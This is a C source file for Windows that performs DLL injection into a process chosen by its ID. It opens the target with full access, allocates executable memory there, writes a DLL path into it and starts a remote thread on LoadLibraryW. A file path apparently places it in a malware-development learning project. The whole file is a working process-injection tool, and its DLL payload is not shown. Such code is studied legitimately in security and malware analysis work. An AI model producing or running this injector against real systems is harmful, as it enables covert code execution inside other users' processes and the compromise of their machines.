#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#include "../header.h"

const wchar_t dllLocation[] = L"...\\Malware Development\\DLL Injection\\dll.dll";
size_t dllLength = sizeof(dllLocation) + 1;

int main(int argc, char** argv){
    DWORD pid;
    HANDLE hKernel32, hProcess, hThread;
    VOID *funcAddress;
    LPVOID rBuffer;

    if(argc < 2){
        print_err("Insufficient number of arguments");
        return EXIT_FAILURE;
    }
    
    hKernel32 = GetModuleHandle("Kernel32");
    funcAddress = GetProcAddress(hKernel32, "LoadLibraryW");

    pid = atoi(argv[1]);
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if(hProcess == NULL){
        print_err("Failed to get handle to process %ld, Error: %ld", pid, GetLastError());
        return EXIT_FAILURE;
    }

    print_ok("Got handle to process %ld", pid);

    rBuffer = VirtualAllocEx(hProcess, NULL, dllLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    print_info("Allocated %d bytes", dllLength);

    WriteProcessMemory(hProcess, rBuffer, dllLocation, dllLength, NULL);
    print_info("Written to process memory");

    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)funcAddress, rBuffer, 0, NULL);
    print_info("Created thread");

    print_info("Closing handles");
    CloseHandle(hThread);
    CloseHandle(hProcess);

    print_ok("Done");
}
